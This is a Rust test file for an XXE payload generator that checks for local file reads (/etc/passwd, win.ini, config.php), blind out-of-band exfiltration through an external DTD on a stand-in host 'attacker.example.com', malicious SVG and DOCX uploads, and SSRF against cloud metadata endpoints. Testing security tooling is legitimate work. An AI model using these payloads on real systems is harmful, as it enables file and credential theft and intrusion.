use super::xxe_engine::*;

const ATTACKER_HOST: &str = "http://attacker.example.com";

fn engine() -> XxeEngine {
    XxeEngine::new(ATTACKER_HOST)
}

// ── BasicFileRead ────────────────────────────────────────────

#[test]
fn basic_file_read_linux_contains_etc_passwd() {
    let payloads = engine().basic_file_read(TargetOs::Linux);
    assert!(payloads.len() >= 3);
    let passwd = payloads.iter().find(|p| p.body.contains("/etc/passwd"));
    assert!(passwd.is_some());
    assert!(passwd.unwrap().body.contains("<!ENTITY xxe SYSTEM"));
    assert_eq!(passwd.unwrap().content_type, "application/xml");
}

#[test]
fn basic_file_read_windows_contains_win_ini() {
    let payloads = engine().basic_file_read(TargetOs::Windows);
    assert!(!payloads.is_empty());
    let win_ini = payloads.iter().find(|p| p.body.contains("win.ini"));
    assert!(win_ini.is_some());
}

#[test]
fn basic_file_read_all_payloads_are_well_formed_xml_declarations() {
    for payload in engine().basic_file_read(TargetOs::Linux) {
        assert!(payload.body.starts_with("<?xml version=\"1.0\""));
        assert!(payload.body.contains("<!DOCTYPE"));
        assert!(payload.body.contains("&xxe;"));
    }
}

#[test]
fn basic_file_read_variant_tag_is_correct() {
    for payload in engine().basic_file_read(TargetOs::Linux) {
        assert_eq!(payload.variant, XxeVariant::BasicFileRead);
    }
}

// ── BlindOob ─────────────────────────────────────────────────

#[test]
fn blind_oob_generates_external_dtd() {
    let bundle = engine().blind_oob(TargetOs::Linux);
    assert!(bundle.external_dtd.contains("file:///etc/passwd"));
    assert!(bundle.external_dtd.contains("%eval;"));
    assert!(bundle.external_dtd.contains("%exfil;"));
}

#[test]
fn blind_oob_payload_references_dtd_url() {
    let bundle = engine().blind_oob(TargetOs::Linux);
    assert!(bundle.payload.body.contains("evil.dtd"));
    assert!(bundle.payload.body.contains(ATTACKER_HOST));
}

#[test]
fn blind_oob_listener_url_contains_exfil_path() {
    let bundle = engine().blind_oob(TargetOs::Linux);
    assert!(bundle.listener_url.contains("xxe-exfil"));
}

#[test]
fn blind_oob_windows_targets_win_ini() {
    let bundle = engine().blind_oob(TargetOs::Windows);
    assert!(bundle.external_dtd.contains("win.ini"));
}

// ── ErrorBased ───────────────────────────────────────────────

#[test]
fn error_based_generates_two_payloads() {
    let payloads = engine().error_based(TargetOs::Linux);
    assert_eq!(payloads.len(), 2);
}

#[test]
fn error_based_nonexistent_path_payload() {
    let payloads = engine().error_based(TargetOs::Linux);
    let nonexistent = &payloads[0];
    assert!(nonexistent.body.contains("nonexistent"));
    assert!(nonexistent.body.contains("/etc/passwd"));
    assert_eq!(nonexistent.variant, XxeVariant::ErrorBased);
}

#[test]
fn error_based_malformed_uri_payload() {
    let payloads = engine().error_based(TargetOs::Linux);
    let malformed = &payloads[1];
    assert!(malformed.body.contains("://%file;"));
}

// ── FileUploadSvg ────────────────────────────────────────────

#[test]
fn svg_payload_is_valid_svg_structure() {
    let payload = engine().file_upload_svg(TargetOs::Linux);
    assert!(payload.body.contains("<svg"));
    assert!(payload
        .body
        .contains("xmlns=\"http://www.w3.org/2000/svg\""));
    assert!(payload.body.contains("</svg>"));
    assert_eq!(payload.content_type, "image/svg+xml");
}

#[test]
fn svg_payload_contains_xxe_entity() {
    let payload = engine().file_upload_svg(TargetOs::Linux);
    assert!(payload.body.contains("<!ENTITY xxe SYSTEM"));
    assert!(payload.body.contains("&xxe;"));
}

#[test]
fn svg_windows_targets_win_ini() {
    let payload = engine().file_upload_svg(TargetOs::Windows);
    assert!(payload.body.contains("win.ini"));
}

// ── FileUploadDocx ───────────────────────────────────────────

#[test]
fn docx_payload_starts_with_zip_magic() {
    let docx = engine().file_upload_docx(TargetOs::Linux);
    assert!(docx.zip_bytes.len() > 100);
    assert_eq!(&docx.zip_bytes[0..4], &[0x50, 0x4b, 0x03, 0x04]);
}

#[test]
fn docx_payload_contains_end_of_central_directory() {
    let docx = engine().file_upload_docx(TargetOs::Linux);
    let eocd = [0x50, 0x4b, 0x05, 0x06];
    let found = docx.zip_bytes.windows(4).any(|w| w == eocd);
    assert!(found);
}

#[test]
fn docx_injected_xml_has_xxe_entity() {
    let docx = engine().file_upload_docx(TargetOs::Linux);
    assert!(docx.injected_xml.contains("<!ENTITY xxe SYSTEM"));
    assert!(docx.injected_xml.contains("/etc/passwd"));
}

#[test]
fn docx_windows_targets_win_ini() {
    let docx = engine().file_upload_docx(TargetOs::Windows);
    assert!(docx.injected_xml.contains("win.ini"));
}

// ── SoapEnvelope ─────────────────────────────────────────────

#[test]
fn soap_payload_has_envelope_structure() {
    let payload = engine().soap_envelope(TargetOs::Linux);
    assert!(payload.body.contains("soap:Envelope"));
    assert!(payload.body.contains("soap:Body"));
    assert!(payload.body.contains("&xxe;"));
    assert!(payload.content_type.contains("text/xml"));
}

#[test]
fn soap_payload_has_correct_namespace() {
    let payload = engine().soap_envelope(TargetOs::Linux);
    assert!(payload
        .body
        .contains("http://schemas.xmlsoap.org/soap/envelope/"));
}

// ── JsonToXml ────────────────────────────────────────────────

#[test]
fn json_to_xml_has_typical_json_field_names() {
    let payload = engine().json_to_xml(TargetOs::Linux);
    assert!(payload.body.contains("<username>"));
    assert!(payload.body.contains("<password>"));
    assert!(payload.body.contains("&xxe;"));
}

#[test]
fn json_to_xml_content_type_is_xml() {
    let payload = engine().json_to_xml(TargetOs::Linux);
    assert_eq!(payload.content_type, "application/xml");
    assert_eq!(payload.variant, XxeVariant::JsonToXmlConversion);
}

// ── PhpFilterChain ───────────────────────────────────────────

#[test]
fn php_filter_linux_has_base64_encode_payloads() {
    let payloads = engine().php_filter_chain(TargetOs::Linux);
    assert!(payloads.len() >= 2);
    for p in &payloads {
        assert!(p.body.contains("php://filter/"));
        assert!(p.body.contains("base64-encode"));
        assert_eq!(p.variant, XxeVariant::PhpFilterChain);
    }
}

#[test]
fn php_filter_windows_targets_web_config() {
    let payloads = engine().php_filter_chain(TargetOs::Windows);
    let has_web_config = payloads.iter().any(|p| p.body.contains("web.config"));
    assert!(has_web_config);
}

#[test]
fn php_filter_linux_targets_config_php() {
    let payloads = engine().php_filter_chain(TargetOs::Linux);
    let has_config = payloads.iter().any(|p| p.body.contains("config.php"));
    assert!(has_config);
}

// ── XxeToSsrf ───────────────────────────────────────────────

#[test]
fn ssrf_targets_aws_metadata() {
    let payloads = engine().xxe_to_ssrf(TargetOs::Linux);
    let aws = payloads.iter().find(|p| p.body.contains("169.254.169.254"));
    assert!(aws.is_some());
}

#[test]
fn ssrf_targets_gcp_metadata() {
    let payloads = engine().xxe_to_ssrf(TargetOs::Linux);
    let gcp = payloads
        .iter()
        .find(|p| p.body.contains("metadata.google.internal"));
    assert!(gcp.is_some());
}

#[test]
fn ssrf_probes_localhost_services() {
    let payloads = engine().xxe_to_ssrf(TargetOs::Linux);
    let localhost = payloads.iter().find(|p| p.body.contains("localhost:8080"));
    assert!(localhost.is_some());
}

#[test]
fn ssrf_payloads_have_correct_variant() {
    for p in engine().xxe_to_ssrf(TargetOs::Linux) {
        assert_eq!(p.variant, XxeVariant::XxeToSsrf);
    }
}

// ── XxeVariant enum ─────────────────────────────────────────

#[test]
fn variant_all_returns_nine_variants() {
    assert_eq!(XxeVariant::all().len(), 9);
}

#[test]
fn variant_display_formats_correctly() {
    assert_eq!(format!("{}", XxeVariant::BasicFileRead), "basic-file-read");
    assert_eq!(format!("{}", XxeVariant::BlindOob), "blind-oob");
    assert_eq!(
        format!("{}", XxeVariant::PhpFilterChain),
        "php-filter-chain"
    );
    assert_eq!(format!("{}", XxeVariant::XxeToSsrf), "xxe-to-ssrf");
}

#[test]
fn variant_severity_ranges() {
    for &v in XxeVariant::all() {
        let sev = v.severity();
        assert!(
            sev >= 5.0 && sev <= 10.0,
            "Severity {sev} out of range for {v}"
        );
    }
}

// ── generate_all ─────────────────────────────────────────────

#[test]
fn generate_all_covers_all_variants() {
    let all = engine().generate_all();
    let mut seen: std::collections::HashSet<XxeVariant> = std::collections::HashSet::new();
    for p in &all {
        seen.insert(p.variant);
    }
    // DOCX is not in generate_all (returns DocxPayload not XxePayload)
    assert!(seen.contains(&XxeVariant::BasicFileRead));
    assert!(seen.contains(&XxeVariant::BlindOob));
    assert!(seen.contains(&XxeVariant::ErrorBased));
    assert!(seen.contains(&XxeVariant::FileUploadSvg));
    assert!(seen.contains(&XxeVariant::SoapEnvelope));
    assert!(seen.contains(&XxeVariant::JsonToXmlConversion));
    assert!(seen.contains(&XxeVariant::PhpFilterChain));
    assert!(seen.contains(&XxeVariant::XxeToSsrf));
}

#[test]
fn generate_all_produces_both_os_payloads() {
    let all = engine().generate_all();
    let has_linux = all.iter().any(|p| p.target_os == TargetOs::Linux);
    let has_windows = all.iter().any(|p| p.target_os == TargetOs::Windows);
    assert!(has_linux);
    assert!(has_windows);
}

// ── exploitation_plan ────────────────────────────────────────

#[test]
fn exploitation_plan_prefixes_endpoint() {
    let plan = engine().exploitation_plan("/api/upload");
    assert!(!plan.is_empty());
    for p in &plan {
        assert!(
            p.description.starts_with("[/api/upload]"),
            "Description missing prefix: {}",
            p.description
        );
    }
}

#[test]
fn exploitation_plan_covers_all_os_variants() {
    let plan = engine().exploitation_plan("/test");
    let linux_count = plan
        .iter()
        .filter(|p| p.target_os == TargetOs::Linux)
        .count();
    let windows_count = plan
        .iter()
        .filter(|p| p.target_os == TargetOs::Windows)
        .count();
    assert!(linux_count > 0);
    assert!(windows_count > 0);
}
